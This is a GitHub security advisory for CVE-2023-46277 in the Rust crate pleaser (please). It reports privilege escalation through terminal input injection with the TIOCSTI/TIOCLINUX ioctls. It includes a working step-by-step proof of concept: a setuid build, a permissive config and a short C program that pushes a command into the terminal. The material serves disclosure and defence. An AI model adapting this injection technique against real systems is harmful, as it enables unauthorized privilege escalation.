# [H] Pleaser privilege escalation vulnerability

## Summary
Severity: High
Advisory: GHSA-cgf8-h3fp-h956
CVE: CVE-2023-46277
CWE: CWE-269
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-10-20
Source: https://github.com/advisories/GHSA-cgf8-h3fp-h956
Type: github-advisory

## Affected
- crates.io: `pleaser` — affected >=0

## Details
please (aka pleaser) through 0.5.4 allows privilege escalation through the TIOCSTI and/or TIOCLINUX ioctl. (If both TIOCSTI and TIOCLINUX are disabled, this cannot be exploited.)

Here is how to see it in action:

```
$ cd "$(mktemp -d)"
$ git clone --depth 1 https://gitlab.com/edneville/please.git
$ cd please/
$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9
$ cargo test && cargo build --release
$ echo "[${USER}_as_nobody]"$'\nname='"${USER}"$'\ntarget=nobody\nrule=.*\nrequire_pass=false' | sudo tee /etc/please.ini
$ sudo chown root:root ./target/release/please
$ sudo chmod u+s ./target/release/please
$ cat <<TIOCSTI_C_EOF | tee TIOCSTI.c
#include <sys/ioctl.h>

int main(void) {
  const char *text = "id\n";
  while (*text)
    ioctl(0, TIOCSTI, text++);
  return 0;
}
TIOCSTI_C_EOF
$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c
$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody
```

Please note that:

This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2023-46277
- https://github.com/rustsec/advisory-db/pull/1798
- https://gitlab.com/edneville/please
- https://gitlab.com/edneville/please/-/issues/13
- https://gitlab.com/edneville/please/-/merge_requests/69#note_1594254575
- https://rustsec.org/advisories/RUSTSEC-2023-0066.html
